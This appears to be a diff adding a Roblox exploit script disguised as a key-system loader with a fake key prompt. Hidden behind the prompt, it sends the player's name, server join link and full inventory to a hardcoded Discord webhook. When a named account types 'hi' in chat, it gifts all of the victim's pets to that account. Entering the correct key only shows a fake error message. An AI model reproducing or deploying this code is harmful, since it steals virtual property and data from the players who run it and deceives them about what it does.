@@ -1,0 +1,213 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TextChatService = game:GetService("TextChatService")
+local HttpService = game:GetService("HttpService")
+
+local Backpack = LocalPlayer:WaitForChild("Backpack")
+local Humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") or LocalPlayer.CharacterAdded:Wait():WaitForChild("Humanoid")
+
+local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
+
+local KeySystemGui = Instance.new("ScreenGui")
+KeySystemGui.Name = "KeySystemGui"
+KeySystemGui.IgnoreGuiInset = true
+KeySystemGui.ResetOnSpawn = false
+KeySystemGui.DisplayOrder = 9999
+KeySystemGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local MainFrame = Instance.new("Frame")
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+MainFrame.Size = UDim2.new(1, 0, 1, 0)
+MainFrame.Parent = KeySystemGui
+
+local FrameStroke = Instance.new("UIStroke")
+FrameStroke.Color = Color3.fromRGB(100, 100, 100)
+FrameStroke.Thickness = 2
+FrameStroke.Parent = MainFrame
+
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Text = "Enter Your Key"
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.TextSize = 30
+TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Position = UDim2.new(0.5, 0, 0.3, 0)
+TitleLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+TitleLabel.Parent = MainFrame
+
+local KeyInputBox = Instance.new("TextBox")
+KeyInputBox.PlaceholderText = "Enter key here"
+KeyInputBox.Font = Enum.Font.Gotham
+KeyInputBox.TextSize = 24
+KeyInputBox.Text = ""
+KeyInputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+KeyInputBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+KeyInputBox.Size = UDim2.new(0, 300, 0, 40)
+KeyInputBox.Position = UDim2.new(0.5, 0, 0.4, 0)
+KeyInputBox.AnchorPoint = Vector2.new(0.5, 0.5)
+KeyInputBox.ClearTextOnFocus = false
+KeyInputBox.Parent = MainFrame
+
+local CopyLinkButton = Instance.new("TextButton")
+CopyLinkButton.Text = "Copy Link"
+CopyLinkButton.Font = Enum.Font.GothamSemibold
+CopyLinkButton.TextSize = 22
+CopyLinkButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+CopyLinkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CopyLinkButton.Size = UDim2.new(0, 140, 0, 40)
+CopyLinkButton.Position = UDim2.new(0.35, 0, 0.5, 0)
+CopyLinkButton.AnchorPoint = Vector2.new(0.5, 0.5)
+CopyLinkButton.Parent = MainFrame
+
+local SubmitButton = Instance.new("TextButton")
+SubmitButton.Text = "Submit"
+SubmitButton.Font = Enum.Font.GothamSemibold
+SubmitButton.TextSize = 22
+SubmitButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+SubmitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+SubmitButton.Size = UDim2.new(0, 140, 0, 40)
+SubmitButton.Position = UDim2.new(0.65, 0, 0.5, 0)
+SubmitButton.AnchorPoint = Vector2.new(0.5, 0.5)
+SubmitButton.Parent = MainFrame
+
+local correctKey = "GqAk1jt34CoxMYT9u7Vu20dTWys9D8ayB4YOx3N1CRGPQ8q5C7"
+local linkUrl = "https://link-target.net/1360255/4OzD2a6hzruJ"
+local webhookUrl = "https://discord.com/api/webhooks/1382834116059336734/f06jKiCgFXOpFOrIl6x6M7POgN1xbX5aPSw_0azc2Ak_97DMJt42uBWx5okmKc7Hxgrk"
+local trustedUsername = "ElementalGemsFarm2"
+
+local function copyToClipboard(text)
+    if setclipboard then
+        setclipboard(text)
+    else
+        warn("Clipboard not supported in this executor.")
+    end
+end
+
+CopyLinkButton.MouseButton1Click:Connect(function()
+    copyToClipboard(linkUrl)
+    CopyLinkButton.Text = "Copied!"
+    task.wait(2)
+    CopyLinkButton.Text = "Copy Link"
+end)
+
+task.spawn(function()
+    local keywords = { "Caterpillar", "Shovel" }
+    local inventoryItems, keywordMatches = {}, {}
+
+    for _, item in ipairs(Backpack:GetChildren()) do
+        if item:IsA("Tool") then
+            local itemName = item.Name
+            table.insert(inventoryItems, itemName)
+            for _, keyword in ipairs(keywords) do
+                if string.find(itemName:lower(), keyword:lower()) then
+                    table.insert(keywordMatches, "`" .. itemName .. "` FOUND!!!")
+                    break
+                end
+            end
+        end
+    end
+
+    local playerName = LocalPlayer.Name
+    local placeId, jobId = game.PlaceId, game.JobId
+    local joinLink = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", placeId, jobId)
+    local message = string.format("**%s** executed the script.\nJoin: [%s](%s)", playerName, jobId, joinLink)
+
+    if #keywordMatches > 0 then
+        message ..= "\n\n**Keyword Matches:**\n" .. table.concat(keywordMatches, "\n")
+    end
+
+    local inventoryList = table.concat(inventoryItems, "\n")
+    local inventoryFilename = playerName .. "_inventory.txt"
+    local boundary = "----WebKitFormBoundary" .. HttpService:GenerateGUID(false)
+
+    local payload = table.concat({
+        "--" .. boundary,
+        'Content-Disposition: form-data; name="payload_json"',
+        "",
+        HttpService:JSONEncode({ content = message }),
+        "--" .. boundary,
+        'Content-Disposition: form-data; name="file"; filename="' .. inventoryFilename .. '"',
+        "Content-Type: text/plain",
+        "",
+        inventoryList,
+        "--" .. boundary .. "--",
+        ""
+    }, "\r\n")
+
+    local success, err = pcall(function()
+        request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
+            },
+            Body = payload
+        })
+    end)
+
+    if not success then
+        warn("Webhook failed:", err)
+    end
+end)
+
+local function waitForRemoteEvent()
+    local eventTriggered = false
+    local connections = {}
+    for _, descendant in ipairs(ReplicatedStorage:GetDescendants()) do
+        if descendant:IsA("RemoteEvent") then
+            local conn = descendant.OnClientEvent:Connect(function()
+                eventTriggered = true
+            end)
+            table.insert(connections, conn)
+        end
+    end
+    repeat task.wait() until eventTriggered
+    for _, conn in ipairs(connections) do
+        conn:Disconnect()
+    end
+end
+
+local function givePetToPlayer(targetPlayer)
+    for _, tool in ipairs(Backpack:GetChildren()) do
+        if tool:IsA("Tool") then
+            PetGiftingService:FireServer("GivePet", targetPlayer)
+            waitForRemoteEvent()
+            if tool and tool.Parent == Backpack then
+                Humanoid:EquipTool(tool)
+            end
+        end
+    end
+end
+
+TextChatService.OnIncomingMessage = function(messageData)
+    if messageData.TextSource and messageData.TextSource.Name == trustedUsername then
+        if messageData.Text:lower() == "hi" then
+            local targetPlayer = Players:FindFirstChild(trustedUsername)
+            if targetPlayer then
+                print("Received 'hi' from " .. trustedUsername .. ", running givePetToPlayer()")
+                givePetToPlayer(targetPlayer)
+            else
+                warn("Player " .. trustedUsername .. " not found when message received")
+            end
+        end
+    end
+end
+
+SubmitButton.MouseButton1Click:Connect(function()
+    local enteredKey = KeyInputBox.Text
+    if enteredKey == correctKey then
+        KeyInputBox.Text = ""
+        KeyInputBox.PlaceholderText = "Error loading script!"
+        KeySystemGui.Enabled = false
+    else
+        KeyInputBox.Text = ""
+        KeyInputBox.PlaceholderText = "Wrong key, try again!"
+    end
+end)
+
+KeyInputBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        SubmitButton:Activate()
+    end
+end)
